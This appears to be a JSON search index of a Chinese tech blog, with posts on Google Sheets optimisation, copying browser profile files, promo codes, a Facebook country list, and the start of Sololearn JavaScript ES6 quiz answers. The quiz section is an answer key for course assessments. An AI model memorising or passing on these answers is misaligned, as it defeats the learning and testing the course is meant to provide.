实例二 有一个动态的内容需要跨表引用，数据会随时增加或者删减。因为数据长度的未知性，就需要引用更多的单元格或者引用一整列，确保增加数据的时候依然在引用的范围内，这样同时也会造成一个问题，会引用更多空白的单元格，造成没必要的性能消耗。 先使用 COUNTA 计算数据的长度，因为数据在第二行，所以需要将数据计算的结果再加一才能保持数据长度一致。 在另外一个工作表先用 IMPORTRANGE 引用数据的长度，也就是 COUNTA 计算的结果。然后引用范围从第二行开始，结束的行设置成计算好的数据长度。这样不管在数据源怎么变动数据，都可以将数据的长度同步到当前的表格，并且只引用需要的范围，这样要比一整列引用数据要小得多。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 跨表引用","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Cross-Reference.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Cross-Reference/","stats":{"text":"3 min read","time":126000,"words":548,"minutes":3},"date":"2023-01-15 19:32:47","dateFormat":"2023-01-15"},{"content":"一个快捷、安全的方式复制浏览器的配置。 此方法基本上适用于基于 Chrome 内核的浏览器。 步骤 浏览器添加一个新的人员。 打开浏览器配置目录。 浏览器每新建一个人员都会在此目录下创建一个名字为 Profile 序号 的文件夹，每新建一个人员序号都会累加。 一般情况下最新建立的人员，是目录在Profile 序号数字最大的那个文件夹。 Google Chrome macOS 路径 ~/Library/Application Support/Google/Chrome Windows 路径 C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data Microsoft Edge macOS 路径 ~/Library/Application Support/Microsoft Edge Windows 路径 C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data Brave-Browser macOS 路径 ~/Library/Application Support/BraveSoftware Windows 路径 C:\\Users\\%username%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data 设置浏览器 先不要使用浏览器打开任何的网页。在右上角打开浏览器的设置，先把浏览器都设置好。 设置好后在 Profile 文件夹内把 Preferences 文件复制出来。 安装插件 在 Chrome 商店安装，还是从第三方渠道安装或者是本地文件安装都可以。 插件全部都安装好并且设置好后，在 Profile 文件夹内把 Extensions 文件夹和 Secure Preferences 文件夹复制出来。 设置书签 将书签都保存好后，在 Profile 文件夹内把 Bookmarks 文件复制出来。 插件配置 将插件设置好相关参数后，在 Profile 文件夹内把 Local Extension Settings 文件夹复制出来。 复制配置 关闭浏览器进程，将备份出来的这些文件和文件夹替换到新建立的人员的 Profile 文件夹内即可。如果软件没有彻底关闭，有些文件处于被占用的状态，会导致替换的文件无法正常生效。 说明 Preferences 用于存储浏览器的各项设置。 Extensions 从 Chrome 商店或者第三方渠道在线安装插件的文件。 Local Extension Settings 插件的配置数据。 Secure Preferences 插件的一些信息，包括从本地安装的插件。 Bookmarks 浏览器的书签。 如果将整个 Profile 配置文件的内容复制给新的人员，会导致“共享 Cookies”的效果。如下图所示： 在任意一个人员登陆了账号，那么账号的 Cookies 会在其它的人员里面也存在，但是这种效果并不合理，每个浏览器的人员的 Cookies 信息必须是独立的。 因为 Profile 里面有很多个文件，每个文件存储着不同的信息，但每个文件具体是保存什么信息的，目前并没有分析和研究。不过只需要按照上面的步骤，将相关的文件复制到对应的浏览器人员就可以了，并不会出现“共享 Cookies” 的效果。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"复制浏览器配置","feature":"https://dev-coco.github.io/post-images/Chrome-Copy-Profile.jpg","link":"https://dev-coco.github.io/post/Chrome-Copy-Profile/","stats":{"text":"3 min read","time":157000,"words":714,"minutes":3},"date":"2023-01-11 21:03:23","dateFormat":"2023-01-11"},{"content":"Skylum Luminar AI 是一款图像编辑软件。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 订阅 Telegram 频道：瑞景乐的博客 获取密码 请输入密码后查看 var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"f5ee5941424d6826bfee1f81279617728d03d5bc959e60248c09fdecadac17186f81628c955005e56183a07634cc2bd24c999d8f64b9e46ed310b07a5c77cb63FIR3Qyn20C9bG9dJgVxXLOlfP0rldXFGed7eacCRWluWlBmLJaRhr5ce+EoajlraPE+jeaSF4wvS7iayw2m028CHP/cmY3IbS8sadfu4POzCw1eT3BUb0B8PlOcb5RagWX+F9mgnueG31jagxHF1ZwcaNtvKzo2pVym8HwgPnCm3b4SjuC4psHLuGZtYsc9s6L10Q+5tNrShxB6Q65+z6kS6kS7Wl4TgWvtt7CF+xdLwWWbpBghE6IPn/7Hm3Qmx9IQN4qq6dtmYZR+wWt/uxf6UJLQc6GNfIivg0C9rsZMZN1eVZMMAwK9jB2JyMgVpfr7Z3K/2UUAbWdiSxHPKgufOxFTAD6O28lA9/KkjjbtcS7b/k+lv2sxrZbF88aTQdAEdtttu9iQ0Tblni606vt0bgQy/jKLH0PxIFNu7ts1y+csVMD03b+EeGGB6+6CJDtn7hulNWU9YvxaQ4rhO0cCTJ7rsXKb3qo9qNvmLI/vLW/bWyEV9+DIT2FtUiUMEx/RFzvVos5rxuOgGhixUiyaWXLEVrW2A+htxdQNtmS9iZPOXolumr2ZS76eehlpPBtx/TA2qDK+2eRV4HTX1kecaB5ZLIjo/gN8194pX7IVrGXWiqVYJRgldXK671X2qKw6M4MrNrRtVl4kTbBMDpoIUvM7EEqotrA17ej2+NRYMUW+HRPgpDir85uAyWKJp8FQIcAapFKgLZbWHdVqJuxn3QiAd0pcYRn7PpJytSHL4hXCUrpSuM83S1YteoF2yHJf2kgLnhl+EZFbRNyP3wnsm5sZtWZdpVddymBBVeWivOLeKJMIotEtXcFW1EaeAH+lCV0A0rdOfmIcXLlhPUxXnQ6NtMtxhZCgnlxuE8Khadxmx3bslNV1Uz8/IRYzPwLfynOekOdCSXRRpZtN/xct3XxArtsmL/oU0v+0hP525aNb30c57M1VjxxzLhcHkRDfCu1nO6d0ySmDYoA+wZBBKfAuSVtIPfiFa9Nm8LlanXwM005zq5UKgee25VCab18F0DrH2dvAiX9S3GZJEb2Q1z1DRjyu1khvLGqVp1zgvy4dIhuZ099tyGWWM5EQs4KHJYjeWmnFOegOZab272nIRYs95G6n61Pey8s7NvTx7qcyYHjqkQa4GlVT4S/B9ghgrmpxNTt6lg6KXami+Pwgx+EYZY/ZPWK/6A09S7G1TId4KNRrpru0DAkgVyFEJz4IdUlNvDl0Ijh7fUSoEzW0O/mCaodGMTOBAElMTAu4mRmdvBSIQu9N/jaBUY540I0q0Q4pNCgOuhFVXSYSZCvRiXA3Q5ImoGvaaeP7sfKLMOzox8JsAr1MJwWcmMmWjTgpshe464j7m3qSGYZM+V2Y5ihCTwMW1vpnxr/Xa+5E/hUD71pXvvl+3stkucCyBMsMQYKqutyU2lnPNexi/1B1eZg/MgPsZwCGPy3T5A3npxVzjMyfXCTjO0NTB9/UCG1kHS6JoSaIIeBstlr+Ok4c7FhLTxqVjh6L6MnwnyWhPtfW8RH78jBTZ6Eu+v4BL\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h})","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"Luminar AI 免费激活码","feature":"https://dev-coco.github.io/post-images/Luminar-AI-Free-License.png","link":"https://dev-coco.github.io/post/Luminar-AI-Free-License/","stats":{"text":"2 min read","time":98000,"words":276,"minutes":2},"date":"2023-01-08 08:49:05","dateFormat":"2023-01-08"},{"content":"单元格越少，速度相对越快。 优化思路 删除无用的行和列。 实例一 新建一个空白表格的时候，默认会创建一个 26 * 1000 单元格的表格，过多的单元格会降低表格的运行速度，即使是空白的单元格也一样，有的时候并没有完全使用到这么多的单元格，所以删除一些用不到的行或者列有助于提升性能。 使用 Google 脚本批量删除未使用到的行和列，也可以新增一个定时器，定期删除空行和列。 function removeEmpty () { const sheets = SpreadsheetApp.getActiveSpreadsheet().getSheets() for (const sheet of sheets) { const maxRows = sheet.getMaxRows() const lastRow = sheet.getLastRow() const maxColumns = sheet.getMaxColumns() const lastColumn = sheet.getLastColumn() if (lastRow != 0 &amp;&amp; maxRows - lastRow != 0) sheet.deleteRows(lastRow + 1, maxRows - lastRow) if (lastColumn != 0 &amp;&amp; maxColumns - lastColumn != 0) sheet.deleteColumns(lastColumn + 1, maxColumns - lastColumn) } } 实例二 打开空白表格的时候，里面没有任何内容，加载的速度会比较快，因为会优先处理当前的表格，然后再处理其它的分表的内容，特别是在表格内有大量函数在计算的时候，这个方法效果会比较明显。 测试结果：常规的表格打开耗时在 10 秒以上，优先打开空白表格耗时 3 秒左右。 相关推荐： Google Excel 性能优化教程目录 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 减少单元格","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Reduce-Cell.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Reduce-Cell/","stats":{"text":"2 min read","time":79000,"words":340,"minutes":2},"date":"2023-01-05 10:09:18","dateFormat":"2023-01-05"},{"content":"不同的引用方式速度也不同。 适用场景 根据不同的数据使用不同的引用方式。 测试条件 在 30 万的数据中使用不同的方式引用。 封闭范围引用 =A1:A300000 耗时 8 秒左右。 从第一行开始到结束引用 =A1:A 耗时 10 秒左右。 整列引用 =A:A 耗时 13 秒左右。 在引用单元格的时候，可能会直接使用 A:A，假设有 1000 行，也就是引用从 A1 到 A1000 这个范围。如果实际用到的单元格没有那么多，也许只用到了 300 行，那么剩下 700 行空白单元格都被引用，这样会无意义的降低运行速度。所以可以缩小引用的范围，而不是一整列引用。 在数据相同长度的情况下，A1:A30000 的运行速度要比 A1:A 快，但是 A1:A 的运行速度要比 A:A 快。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 引用范围","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Reference-Range.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Reference-Range/","stats":{"text":"1 min read","time":55000,"words":254,"minutes":1},"date":"2022-12-30 12:27:17","dateFormat":"2022-12-30"},{"content":"用 IF 函数跳过无效内容，加快运行速度。 适用场景 数据量比较多，而且数据比较杂乱。 例如需要将 A 列的内容，根据 E 和 F 列匹配出对应的内容，A 列的内容掺杂着一些空值。 优化思路 用 IF 函数判断 A 列的内容是否是空值，如果不是空值再使用 VLOOKUP 函数进行匹配，如果是空值直接跳过，节省使用 VLOOKUP 匹配空内容的性能消耗。 实例 需要先理解 VLOOKUP 的计算原理。例如从一个列表中要匹配出 pin 对应的中文，那么就需要从头到尾一个一个的去判断是否是一致，如果是一致的，再返回第 2 列的内容，那么匹配 pin 这个单词就需要计算 13 次。 如果是空内容，词组有多长，就需要计算多少次，但是我们已知肯定是查询不到结果的。 在 VLOOKUP 的外层使用 IF 函数进行判断是否是空值，如果是空值，直接返回空值，跳过 VLOOKUP计算，这样只需要计算一次就返回结果了，不用计算一整列再返回结果，可以大幅增加计算的速度。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - IF 跳过无效内容","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-Bypass-Blank.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-Bypass-Blank/","stats":{"text":"2 min read","time":70000,"words":336,"minutes":2},"date":"2022-12-26 11:51:17","dateFormat":"2022-12-26"},{"content":"用 IF 函数做一个开关控制函数执行。 适用场景 使用频率不高，只是偶尔使用。 例如需要将 A 列的内容翻译成中文，那么翻译后内容就不再使用了，除非等到下次 A 列的内容有变更才需要再次翻译。 优化思路 每次打开工表格的时候就会执行函数，但是按照需求来看，A 列的内容没有变更是不需要再执行函数翻译了，这样会造成没必要的性能浪费。 使用下拉菜单做一个开关，用 IF 函数判断下拉菜单是否开启，若开启再执行函数，关闭就不再执行函数。这样仅在必要的时候手动让函数计算，在不使用的时候就可以节约性能的消耗。 实例 在任意单元格建立一个下拉菜单，作为开关。 设置开启和关闭。 在函数的外层使用 IF 函数引用下拉菜单的内容进行判断。 当 B1 的下拉菜单处于关闭时，翻译的函数就不会执行。仅在需要使用的时候，将下拉菜单选择开启才会执行。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - IF 管理函数执行","feature":"https://dev-coco.github.io/post-images/Google-Excel-Boost-IF-Manage.png","link":"https://dev-coco.github.io/post/Google-Excel-Boost-IF-Manage/","stats":{"text":"2 min read","time":66000,"words":326,"minutes":2},"date":"2022-12-24 05:02:02","dateFormat":"2022-12-24"},{"content":"一行公式快速生成 26 个字母。 有时候会需要用到 26 个英文字母，如果用键盘一个一个地敲 A, B, C, D… 的话就太花时间了，下面有两个方法快速生成 26 个字母。 方法1 =ARRAYFORMULA(REGEXEXTRACT(ADDRESS(1, ROW(A1:A26), 2), &quot;^.&quot;)) 原理分析 使用 ROW 函数获取开头 26 行，因为一共有 26 个英文字母。现在还没有使用数组，所以目前只会输出 1 个。 再使用 ADDRESS 函数，将刚才 ROW 函数计算的结果放到列参数里，因为列是按照字母排序的，引用模式选择相对应用列，为了方便接下来的筛选，绝对引用。使用 ARRAYFORMULA 数组函数输出看一下效果。 现在已经获取了 26 个引用的位置，也包含了 26 个字母，使用 REGEXEXTRACT 函数用正则表达式语法 ^. 获取开头的第一个字符，并且用数组输出，这样就获取了 26 个大写字母。 如果要生成 26 个小写字母，在 REGEXEXTRACT 函数的外面使用 LOWER 函数。 =ARRAYFORMULA(LOWER(REGEXEXTRACT(ADDRESS(1, ROW(A1:A26), 2), &quot;^.&quot;))) 方法2 =ARRAYFORMULA(CHAR(ROW(A65:A90))) 原理分析 使用 ROW 函数获取 A65 到 A90 的行数，也就就是从 65 到 90。现在还没有使用数组，所有目前只会输出 1 个。 因为 A 对应的十进制 Unicode 编码是 65，那么使用 CHAR 函数将计算出来的行数转换成字符，最后再用数组输出。 如果要生成 26 个小写字母，可以使用下面的公式： =ARRAYFORMULA(CHAR(ROW(A97:A122))) 因为从 97 到 122 的十进制 Unicode 编码对应的是 26 个小写字母。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 快速生成 26 个字母","feature":"https://dev-coco.github.io/post-images/Google-Excel-Create-Letter.png","link":"https://dev-coco.github.io/post/Google-Excel-Create-Letter/","stats":{"text":"2 min read","time":99000,"words":435,"minutes":2},"date":"2022-12-12 06:34:01","dateFormat":"2022-12-12"},{"content":"抖音视频无水印高清下载。 工具链接：抖音视频下载 放入抖音视频的链接，点击开始运行，然后会解析出视频的详情信息，在下方点击按钮就可以下载视频或者音频了，视频是无水印高清的。 ","tags":[],"title":"抖音视频下载","feature":"","link":"https://dev-coco.github.io/post/TikTok-Video-Download/","stats":{"text":"1 min read","time":15000,"words":77,"minutes":1},"date":"2022-12-06 00:12:40","dateFormat":"2022-12-06"},{"content":"🎄 圣诞帽头像一键生成，各种款式都有！请为你的头像戴上圣诞帽吧！ 工具链接：头像加圣诞帽 点击上传头像，选择一个图片，但并不会将图片上传到服务器，完全在本地运行。 然后就可以挑选喜欢的圣诞帽款式，为头像加上圣诞帽了。 设置好后点击生成头像，然后再对着图片点击右键就可以将头像保存到本地了。 相关推荐：头像加口罩 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"头像加圣诞帽","feature":"","link":"https://dev-coco.github.io/post/Profile-Santa-Hat/","stats":{"text":"1 min read","time":27000,"words":135,"minutes":1},"date":"2022-12-04 04:25:45","dateFormat":"2022-12-04"},{"content":"Windscribe 是加拿大的一家 VPN 服务供应商。 打开 Windscribe 官网。 注册一个账号。 进入账号界面：https://windscribe.com/myaccount 输入激活码: KOOBIDEH 然后就可以免费领到 30GB 流量了。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"Windscribe VPN 免费 30GB 流量激活码","feature":"","link":"https://dev-coco.github.io/post/Windscribe-VPN-Free-License/","stats":{"text":"1 min read","time":12000,"words":54,"minutes":1},"date":"2022-11-28 08:49:39","dateFormat":"2022-11-28"},{"content":"制作一个动态单元格目录，快速找到对应菜单。 在遇到一个特别宽表格的时候，横向找内容就会比较费劲，这个时候就需要使用指向单元格的链接功能建立一个超链接，点击链接就可以跳转到对应的标题。 但是这样的方法存在一个问题，当表格增加新的列的时候，之前引用的范围就会发生偏移，就会导致对应不上。 解决方法 使用以下函数即可实现动态指向单元格目录。 =ARRAYFORMULA(HYPERLINK(&quot;#gid=id&amp;range=&quot;&amp;ADDRESS(1, MATCH(TRANSPOSE(FILTER(B1:1, B1:1 &lt;&gt; &quot;&quot;)), 1:1, 0), 4), TRANSPOSE(FILTER(B1:1, B1:1 &lt;&gt; &quot;&quot;)))) 先来分析一下指向单元格的原理。 超链接的格式：#gid=XXXX&amp;range=B1，中间的 gid 是当前表格的 id，range 对应的参数是指向单元格的位置。那么就可以使用 HYPERLINK 函数创建一个超文本链接，但是目前还需要获取到菜单的名称和菜单对应的单元格位置。 获取菜单名字 使用 FILTER 函数获取菜单的内容，FILTER(B1:1, B1:1 &lt;&gt; &quot;&quot;) 并且去掉空的单元格，这样会比较严谨，如果是多个单元格合并的菜单也可以兼容。 不过我们需要的是纵向的菜单，使用 TRANSPOSE 将内容进行转置。 获取单元格位置 在获取菜单名字的基础上，再使用 MATCH 函数查询每个菜单出现的位置，并且使用数组输出查看效果。 在此基础上添加 ADDRESS 参数，行数设置第一行，列数放入刚才的参数，引用模式要选择相对引用行和列，因为指向单元格功能不支持绝对引用。 超文本链接输出 最后再使用 HYPERLINK 函数放入菜单名字和单元格位置一起输出。因为指向单元格链接的格式中的 gid 无法通过原生函数获取到，所以需要手动设置，并且和获取到菜单的单元格位置拼接在一起。 HYPERLINK(&quot;#gid=1147213490&amp;range=&quot;&amp;ADDRESS(1, MATCH(TRANSPOSE(FILTER(B1:1, B1:1 &lt;&gt; &quot;&quot;)), 1:1, 0), 4), TRANSPOSE(FILTER(B1:1, B1:1 &lt;&gt; &quot;&quot;))) 最后再使用 ARRAYFORMULA 函数输出就可以实现动态指向单元格目录了，即使菜单使用合并单元格也不会影响。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 动态指向单元格目录","feature":"https://dev-coco.github.io/post-images/Google-Excel-Dynamic-Direction-Cell.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Dynamic-Direction-Cell/","stats":{"text":"3 min read","time":143000,"words":631,"minutes":3},"date":"2022-11-23 05:10:54","dateFormat":"2022-11-23"},{"content":"Facebook 可识别的国家列表。 地区 代码 阿尔巴尼亚 AL 阿尔及利亚 DZ 阿富汗 AF 阿根廷 AR 阿联酋 AE 阿鲁巴 AW 阿曼 OM 阿塞拜疆 AZ 埃及 EG 埃塞俄比亚 ET 爱尔兰 IE 爱沙尼亚 EE 安道尔 AD 安哥拉 AO 安圭拉 AI 安提瓜岛 AG 奥地利 AT 奥兰群岛 AX 澳大利亚 AU 澳门 MO 巴巴多斯岛 BB 巴布亚新几内亚 PG 巴哈马 BS 巴基斯坦 PK 巴拉圭 PY 巴勒斯坦 PS 巴林 BH 巴拿马 PA 巴西 BR 白俄罗斯 BY 百慕大 BM 保加利亚 BG 北马里亚纳群岛 MP 贝宁 BJ 比利时 BE 冰岛 IS 波多黎各 PR 波兰 PL 波斯尼亚和黑塞哥维那 BA 玻利维亚 BO 伯利兹 BZ 博茨瓦纳 BW 博内尔，圣尤斯特歇斯和沙巴 BQ 不丹 BT 布基纳法索 BF 布隆迪 BI 布韦岛 BV 朝鲜 KP 赤道几内亚 GQ 丹麦 DK 德国 DE 东帝汶 TL 多哥 TG 多米尼加共和国 DO 多米尼克 DM 俄罗斯 RU 厄瓜多尔 EC 厄立特里亚 ER 法国 FR 法罗群岛 FO 法属玻利尼西亚 PF 法属圭亚那 GF 法属南部领地 TF 法属圣马丁 MF 梵蒂冈城 VA 菲律宾 PH 斐济 FJ 芬兰 FI 佛得角 CV 福克兰群岛 FK 冈比亚 GM 刚果共和国 CG 刚果民主共和国 CD 哥伦比亚 CO 哥斯达黎加 CR 格林纳达 GD 格陵兰 GL 格鲁吉亚 GE 根西岛 GG 古巴 CU 瓜德罗普岛 GP 关岛 GU 圭亚那 GY 哈萨克斯坦 KZ 海地 HT 韩国 KR 荷兰 NL 荷属安的列斯群岛 AN 荷属圣马丁 SX 赫德岛和麦克唐纳群岛 HM 黑山共和国 ME 洪都拉斯 HN 基里巴斯 KI 吉布提 DJ 吉尔吉斯斯坦 KG 几内亚 GN 几内亚比绍共和国 GW 加拿大 CA 加纳 GH 加蓬 GA 柬埔寨 KH 捷克 CZ 津巴布韦 ZW 喀麦隆 CM 卡塔尔 QA 开曼群岛 KY 科科斯（基林）群岛 CC 科摩罗 KM 科索沃 XK 科特迪瓦 CI 科威特 KW 克罗地亚 HR 肯尼亚 KE 库克群岛 CK 库拉索 CW 拉脱维亚 LV 莱索托 LS 老挝 LA 黎巴嫩 LB 立陶宛 LT 利比里亚 LR 利比亞 LY 列支敦士登 LI 留尼汪 RE 卢森堡 LU 卢旺达 RW 罗马尼亚 RO 马达加斯加 MG 马恩岛 IM 马尔代夫 MV 马耳他 MT 马拉维 MW 马来西亚 MY 马里 ML 马其顿 MK 马绍尔群岛 MH 马提尼克岛 MQ 马约特 YT 毛里求斯 MU 毛里塔尼亚 MR 美国 US 美国本土外小岛屿 UM 美属萨摩亚 AS 美属维尔京群岛 VI 蒙古 MN 蒙塞拉特岛 MS 孟加拉国 BD 秘鲁 PE 密克罗尼西亚联邦 FM 缅甸 MM 摩尔多瓦 MD 摩洛哥 MA 摩纳哥 MC 莫桑比克 MZ 墨西哥 MX 纳米比亚 NA 南非 ZA 南极洲 AQ 南乔治亚岛和南桑威奇群岛 GS 南苏丹 SS 瑙鲁 NR 尼加拉瓜 NI 尼泊尔 NP 尼日尔 NE 尼日利亚 NG 纽埃 NU 挪威 NO 诺福克岛 NF 帕劳 PW 皮特凯恩 PN 葡萄牙 PT 日本 JP 瑞典 SE 瑞士 CH 萨尔瓦多 SV 萨摩亚 WS 塞尔维亚 RS 塞拉利昂 SL 塞内加尔 SN 塞浦路斯 CY 塞舌尔 SC 沙特阿拉伯 SA 圣巴泰勒米 BL 圣诞岛 CX 圣多美和普林西比 ST 圣赫勒拿 SH 圣基茨和尼维斯 KN 圣卢西亚 LC 圣马力诺 SM 圣皮埃尔和密克隆 PM 圣文森特和格林纳丁斯 VC 斯里兰卡 LK 斯洛伐克 SK 斯洛文尼亚 SI 斯瓦尔巴群岛和扬马延岛 SJ 斯威士兰 SZ 苏丹 SD 苏里南 SR 所罗门群岛 SB 索马里 SO 塔吉克斯坦 TJ 台湾 TW 泰国 TH 坦桑尼亚 TZ 汤加 TO 特克斯和凯科斯群岛 TC 特立尼达和多巴哥 TT 突尼斯 TN 图瓦卢 TV 土耳其 TR 土库曼斯坦 TM 托克劳 TK 瓦利斯和富图纳群岛 WF 瓦努阿图 VU 危地马拉 GT 委内瑞拉 VE 文莱 BN 乌干达 UG 乌克兰 UA 乌拉圭 UY 乌兹别克斯坦 UZ 西班牙 ES 西撒哈拉 EH 希腊 GR 香港 HK 新加坡 SG 新喀里多尼亚 NC 新西兰 NZ 匈牙利 HU 叙利亚 SY 牙买加 JM 亚美尼亚 AM 也门 YE 伊拉克 IQ 伊朗 IR 以色列 IL 意大利 IT 印度 IN 印度尼西亚 ID 英国 GB 英属维尔京群岛 VG 英属印度洋领地 IO 约旦 JO 越南 VN 赞比亚 ZM 泽西岛 JE 乍得 TD 直布罗陀 GI 智利 CL 中非共和国 CF 中国 CN ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 国家列表","feature":"","link":"https://dev-coco.github.io/post/Facebook-Country-List/","stats":{"text":"5 min read","time":289000,"words":1229,"minutes":5},"date":"2022-11-16 08:59:39","dateFormat":"2022-11-16"},{"content":"自动化操作，减少机械性操作。 有时候需要每天在工作表加一行/列，并且设置当天日期，如果使用 Google 脚本来实现这个功能完全可以达到全自动化。 先获取当前的电子表格。 const sheet = SpreadsheetApp.getActiveSheet() 然后在指定的位置加行/列。 // 添加行 sheet.insertRows(2) // 添加列 sheet.insertColumns(2) 最后获取指定的单元格，使用 setValue 写入当天日期。 sheet.getRange('A2').setValue(new Date()) 写入的日期会根据工作表的单元格格式而变化。 最后再设置一个触发器，每天定时运行就可以实现自动化在工作表加行/列。 完整代码如下： function myFunction () { const sheet = SpreadsheetApp.getActiveSheet() // 添加行 sheet.insertRows(2) // 添加列 sheet.insertColumns(2) sheet.getRange('A2').setValue(new Date()) } ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"自动加行/列并设置日期","feature":"https://dev-coco.github.io/post-images/Google-Script-Add-Row-Column.jpg","link":"https://dev-coco.github.io/post/Google-Script-Add-Row-Column/","stats":{"text":"1 min read","time":46000,"words":202,"minutes":1},"date":"2022-11-04 12:17:38","dateFormat":"2022-11-04"},{"content":"偏向于基础的循序渐进的教学内容。 .ytb { background-image: url('https://www.youtube.com/s/desktop/23aac7a2/img/favicon_32x32.png'); width: 28px; height: 28px; float: left; background-repeat: no-repeat; background-position: center; background-size: cover } 初衷 在早期研究 Google 脚本的时候，发现很多的教程都是外语的，中文的教程少之又少，而且很多教程只是针对某一个功能进行讲解，没有找到一套循序渐进的教程。所以我会将这段时间学习 Google 脚本的笔记整理成比较偏向基础的内容，方便入门。不过要想真正使用 Google 脚本来实现预期的一些功能，建议还是需要学习一些 Javascript 编码知识。 声明：本博客的 Google 脚本系列教程纯属技术随笔，不具有权威性，仅代表个人观点。 需要提前了解的基础知识 Javascript 数据类型 变量 Object 数组、二维数组 循环 函数 Fetch 网络请求 Google Excel 基础知识 表格基本操作 理解单元格范围、行和列 其它 基本的理解能力 HTML 标签 目录 序号 视频 目录 0 界面介绍 1 读取电子表格 2 读取工作表 3 工作表相关 4 操作表格 5 Logger 调试 6 获取范围 7 获取行和列数 8 读写内容 9 菜单 10 创建 Web 页面 11 操作行和列 12 客户端和服务端通信 13 制作 API 接口 14 触发器 更多内容和案例请参考：Google 脚本标签 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本基础教程目录","feature":"https://dev-coco.github.io/post-images/Google-Script-Tutorial.jpg","link":"https://dev-coco.github.io/post/Google-Script-Tutorial/","stats":{"text":"2 min read","time":88000,"words":388,"minutes":2},"date":"2022-10-23 06:41:52","dateFormat":"2022-10-23"},{"content":"Sololearn JavaScript course ECMAScript 6 answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn JavaScript course. Sololearn JavaScript course Overview answers Sololearn JavaScript course Basic Concepts answers Sololearn JavaScript course Conditionals and Loops answers Sololearn JavaScript course Functions answers Sololearn JavaScript course Objects answers Sololearn JavaScript course Core Objects answers Sololearn JavaScript course DOM &amp; Events answers 55.1 Lesson Intro to ES6 Question: ECMAScript 6 JavaScript and ES6 are different technologies for different purposes. Answer: False 56.1 Lesson ES6 Variables and Strings Question: var &amp; let What is the output of this code? function letItBe() { let v = 2; if (true) { let v = 4; console.log(v); } console.log(v); } letItBe(); Answer: 4 2 Question: const Fill in the blanks to make a constant named total and the variable i that is only accessible inside the loop. Answer: const total = 100; let sum = 0; for(let i = 0; i &lt; total; i++) { sum += i; } Question: Template Literals in ES6 Fill in the blanks to output &quot;We are learning ES6!&quot;. Answer: let n = 6; let s = 'ES'; let msg = `We are learning ${s + n}!`; console.log(msg); 57.1 Lesson Loops and Functions in ES6 Question: Loops in ECMAScript 6 Fill in the blanks to iterate through all the characters using the for...of loop. Answer: for (let ch of &quot;SoloLearn&quot;) { console.log(ch); } Question: Functions in ECMAScript 6 Fill in the blanks to declare an arrow function that takes an array and prints the odd elements. Answer: const printOdds = (arr) =&gt; { arr.forEach(el =&gt; { if (el % 2 != 0) console.log(el); }); } Question: Default Parameters in ES6 What is the output of this code? function magic(a, b = 40) { return a + b; } console.log(magic(2)); Answer: 42 58.1 Lesson ES6 Objects Question: ES6 Objects Fill in the blanks to make this code run and print 60. Answer: let car = { speed: 40, accelerate() { this.speed += 10; } }; car.accelerate(); car.accelerate(); console.log(car.speed); Question: Computed 